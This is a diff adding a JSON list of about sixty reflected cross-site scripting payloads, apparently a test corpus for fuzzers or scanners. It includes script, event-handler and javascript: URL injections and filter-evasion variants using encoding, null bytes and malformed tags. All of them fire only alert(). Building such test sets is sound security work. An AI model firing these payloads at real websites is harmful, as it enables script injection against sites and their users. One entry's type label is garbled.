@@ -1,0 +1,299 @@
+{
+  "payloads": [
+    {
+      "type": "basic_reflected_xss",
+      "description": "Basic script tag reflected in URL",
+      "payload": "<script>alert('XSS')</script>"
+    },
+    {
+      "type": "basic_reflected_xss",
+      "description": "Image tag with onerror event",
+      "payload": "<img src=x onerror=alert('XSS')>"
+    },
+    {
+      "type": "basic_reflected_xss",
+      "description": "Iframe tag with alert",
+      "payload": "<iframe src='javascript:alert(1)'></iframe>"
+    },
+    {
+      "type": "basic_reflected_xss",
+      "description": "SVG tag with onload alert",
+      "payload": "<svg onload=alert('XSS')>"
+    },
+    {
+      "type": "basic_reflected_xss",
+      "description": "Eval function with XSS",
+      "payload": "eval(\"alert('XSS')\")"
+    },
+    {
+      "type": "basic_reflected_xss",
+      "description": "URL with javascript scheme",
+      "payload": "javascript:alert('XSS')"
+    },
+    {
+      "type": "basic_reflected_xss",
+      "description": "Input tag with onfocus alert",
+      "payload": "<input onfocus=alert('XSS')>"
+    },
+    {
+      "type": "basic_reflected_xss",
+      "description": "Body tag with onload alert",
+      "payload": "<body onload=alert('XSS')>"
+    },
+    {
+      "type": "basic_reflected_xss",
+      "description": "Anchor tag with JavaScript in href",
+      "payload": "<a href='javascript:alert(\"XSS\")'>Click me</a>"
+    },
+    {
+      "type": "basic_reflected_xss",
+      "description": "Form tag with onsubmit alert",
+      "payload": "<form onsubmit=alert('XSS')>"
+    },
+    {
+      "type": "basic_reflected_xss",
+      "description": "Div tag with onmouseover alert",
+      "payload": "<div onmouseover=alert('XSS')>Hover me</div>"
+    },
+    {
+      "type": "basic_reflected_xss",
+      "description": "Textarea tag with onfocus alert",
+      "payload": "<textarea onfocus=alert('XSS')></textarea>"
+    },
+    {
+      "type": "basic_reflected_xss",
+      "description": "Select tag with onfocus alert",
+      "payload": "<select onfocus=alert('XSS')><option>Test</option></select>"
+    },
+    {
+      "type": "basic_reflected_xss",
+      "description": "Button tag with onclick alert",
+      "payload": "<button onclick=alert('XSS')>Click me</button>"
+    },
+    {
+      "type": "basic_reflected_xss",
+      "description": "Meta tag with refresh and JavaScript",
+      "payload": "<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>"
+    },
+    {
+      "type": "basic_reflected_xss",
+      "description": "Audio tag with onerror alert",
+      "payload": "<audio src=x onerror=alert('XSS')>"
+    },
+    {
+      "type": "basic_reflected_xss",
+      "description": "Video tag with onerror alert",
+      "payload": "<video src=x onerror=alert('XSS')>"
+    },
+    {
+      "type": "basic_reflected_xss",
+      "description": "Inline script with alert",
+      "payload": "<script>alert('XSS')</script>"
+    },
+    {
+      "type": "basic_reflected_xss",
+      "description": "HTML entity encoded XSS",
+      "payload": "&lt;script&gt;alert('XSS')&lt;/script&gt;"
+    },
+    {
+      "type": "basic_reflected_xss",
+      "description": "Injecting JavaScript into an attribute",
+      "payload": "<div data-test='\" onmouseover=alert(1) x=''></div>"
+    },
+    {
+      "type": "basic_reflected_xss",
+      "description": "Iframe with onerror event",
+      "payload": "<iframe src=x onerror=alert('XSS')></iframe>"
+    },
+    {
+      "type": "basic_reflected_xss",
+      "description": "Obfuscated JavaScript alert",
+      "payload": "<script>alert&#40;'XSS'&#41;</script>"
+    },
+    {
+      "type": "basic_reflected_xss",
+      "description": "Onunload event with alert",
+      "payload": "<body onunload=alert('XSS')>"
+    },
+    {
+      "type": "basic_reflected_xss",
+      "description": "DOM-based XSS via document.location",
+      "payload": "<script>document.location='javascript:alert(1)';</script>"
+    },
+    {
+      "type": "basic_reflected_xss",
+      "description": "Double encoded XSS payload",
+      "payload": "%253Cscript%253Ealert%25281%2529%253C/script%253E"
+    },
+    {
+      "type": "basic_reflected_xss",
+      "description": "Base tag href attribute with JavaScript injection",
+      "payload": "<head><base href=\"javascript://\"></head><body><a href=\"/. /,javascript:alert(1)//#\">XXX</a></body>"
+    },
+    {
+      "type": "basic_reflected_xss",
+      "description": "Script tag using onreadystatechange event",
+      "payload": "<SCRIPT FOR=document EVENT=onreadystatechange>javascript:alert(1)</SCRIPT>"
+    },
+    {
+      "type": "basic_reflected_xss",
+      "description": "Object tag with DataURL parameter for JavaScript injection",
+      "payload": "<OBJECT CLASSID=\"clsid:333C7BC4-460F-11D0-BC04-0080C7055A83\"><PARAM NAME=\"DataURL\" VALUE=\"javascript:alert(1)\"></OBJECT>"
+    },
+    {
+      "type": "basic_reflected_xss",
+      "description": "Script tag injected inside broken HTML",
+      "payload": "<b <script>alert(1)</script>0"
+    },
+    {
+      "type": "basic_reflected_xss",
+      "description": "Div tag with input field for onmouseover XSS",
+      "payload": "<div id=\"div1\"><input value=\"``onmouseover=javascript:alert(1)\"></div> <div id=\"div2\"></div><script>document.getElementById(\"div2\").innerHTML = document.getElementById(\"div1\").innerHTML;</script>"
+    },
+    {
+      "type": "basic_reflected_xss",
+      "description": "Malformed tag for XSS injection",
+      "payload": "<x '=\"foo\"><x foo='><img src=x onerror=javascript:alert(1)//'>"
+    },
+    {
+      "type": "basic_reflected_xss",
+      "description": "Embed tag with JavaScript injection",
+      "payload": "<embed src=\"javascript:alert(1)\">"
+    },
+    {
+      "type": "basic_reflected_xss",
+      "description": "Img tag with JavaScript in src attribute",
+      "payload": "<img src=\"javascript:alert(1)\">"
+    },
+    {
+      "type": "basic_reflected_xss",
+      "description": "Image tag with JavaScript in src attribute",
+      "payload": "<image src=\"javascript:alert(1)\">"
+    },
+    {
+      "type": "basic_reflected_xss",
+      "description": "Script tag with JavaScript in src attribute",
+      "payload": "<script src=\"javascript:alert(1)\">"
+    },
+    {
+      "type": "basic_reflected_xss",
+      "description": "Div tag with CSS glow filter and onfilterchange event",
+      "payload": "<div style=width:1px;filter:glow onfilterchange=javascript:alert(1)>x"
+    },
+    {
+      "type": "basic_reflected_xss",
+      "description": "PHP script tag with JavaScript injection",
+      "payload": "<? foo=\"\"><script>javascript:alert(1)</script>"
+    },
+    {
+      "type": "basic_reflected_xss",
+      "description": "HTML comment injection with JavaScript",
+      "payload": "<! foo=\"\"><script>javascript:alert(1)</script>"
+    },
+    {
+      "type": "basic_reflected_xss",
+      "description": "HTML comment injection variation",
+      "payload": "</ foo=\"\"><script>javascript:alert(1)</script>"
+    },
+    {
+      "type": "basic_reflected_xss",
+      "description": "Body tag with onkeydown event injection",
+      "payload": "<body onkeydown=\"javascript:javascript:alert(1)\"></body>"
+    },
+    {
+      "type": "basic_reflected_xss",
+      "description": "Iframe tag with onbeforeload event",
+      "payload": "<iframe onbeforeload=\"javascript:javascript:alert(1)\"></iframe>"
+    },
+    {
+      "type": "basic_reflected_xss",
+      "description": "Iframe src attribute with JavaScript",
+      "payload": "<iframe src=\"javascript:javascript:alert(1)\"></iframe>"
+    },
+    {
+      "type": "basic_reflected_xss",
+      "description": "SVG tag with onload event",
+      "payload": "<svg onload=\"javascript:javascript:alert(1)\"></svg>"
+    },
+    {
+      "type": "basic_reflected_xss",
+      "description": "HTML tag with onmousemove event",
+      "payload": "<html onmousemove=\"javascript:javascript:alert(1)\"></html>"
+    },
+    {
+      "type": "body_tag_onblur_injectionbasic_reflected_xss",
+      "description": "Body tag with onblur event",
+      "payload": "<body onblur=\"javascript:javascript:alert(1)\"></body>"
+    },
+    {
+      "type": "basic_reflected_xss",
+      "description": "Malformed script tag for injection",
+      "payload": "\\x3Cscript>javascript:alert(1)</script>"
+    },
+    {
+      "type": "basic_reflected_xss",
+      "description": "Obfuscated script tag for JavaScript injection",
+      "payload": "'\"`><script>/* *\\x2Fjavascript:alert(1)// */</script>"
+    },
+    {
+      "type": "basic_reflected_xss",
+      "description": "Script tag with carriage return injection",
+      "payload": "<script>javascript:alert(1)</script\\x0D"
+    },
+    {
+      "type": "basic_reflected_xss",
+      "description": "Script tag with line feed injection",
+      "payload": "<script>javascript:alert(1)</script\\x0A"
+    },
+    {
+      "type": "basic_reflected_xss",
+      "description": "Script tag with vertical tab injection",
+      "payload": "<script>javascript:alert(1)</script\\x0B"
+    },
+    {
+      "type": "basic_reflected_xss",
+      "description": "Script tag with charset attribute for JavaScript injection",
+      "payload": "<script charset=\"\\x22>javascript:alert(1)</script>"
+    },
+    {
+      "type": "basic_reflected_xss",
+      "description": "Obfuscated img tag injection",
+      "payload": "`\"'><img src='#\\x27 onerror=javascript:alert(1)>"
+    },
+    {
+      "type": "basic_reflected_xss",
+      "description": "Anchor tag with obfuscated JavaScript",
+      "payload": "<a href=\"javascript\\x3Ajavascript:alert(1)\" id=\"fuzzelement1\">test</a>"
+    },
+    {
+      "type": "basic_reflected_xss",
+      "description": "Obfuscated payload inside SVG and script tags",
+      "payload": "'\"`><p><svg><script>a='hello\\x27;javascript:alert(1)//';</script></p>"
+    },
+    {
+      "type": "basic_reflected_xss",
+      "description": "Anchor tag with null byte in JavaScript injection",
+      "payload": "<a href=\"javas\\x00cript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>"
+    },
+    {
+      "type": "basic_reflected_xss",
+      "description": "Anchor tag with carriage return in JavaScript injection",
+      "payload": "<a href=\"javas\\x0Dcript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>"
+    },
+    {
+      "type": "basic_reflected_xss",
+      "description": "Anchor tag with various obfuscated JavaScript injection payloads",
+      "payload": "<a href=\"javas\\x0Acript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>"
+    },
+    {
+      "type": "basic_reflected_xss",
+      "description": "Script tag with obfuscated comment injection",
+      "payload": "<script>/* *\\x2A/javascript:alert(1)// */</script>"
+    },
+    {
+      "type": "basic_reflected_xss",
+      "description": "Script tag with null byte obfuscation",
+      "payload": "<script>/* *\\x00/javascript:alert(1)// */</script>"
+    }
+  ]
+}
